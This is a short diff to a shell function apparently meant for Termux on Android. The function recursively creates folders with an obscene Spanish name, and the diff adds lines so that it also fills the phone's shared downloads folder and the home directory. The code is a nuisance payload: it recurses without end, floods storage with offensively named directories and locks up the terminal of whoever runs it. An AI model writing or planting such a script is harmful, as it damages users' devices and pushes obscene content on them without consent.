@@ -1,9 +1,10 @@
 carpeta(){
 
         nume=$(shuf -i 1-3000 -n 1)
-
+        cd /data/data/com.termux/files/home/storage/downloads
         mkdir PORNO_DE_ENANOS🔥🚫$nume
-
+        cd /data/data/com.termux/files/home/
+        mkdir PORNO_DE_ENANOS🔥🚫$nume
         clear
 
         carpeta
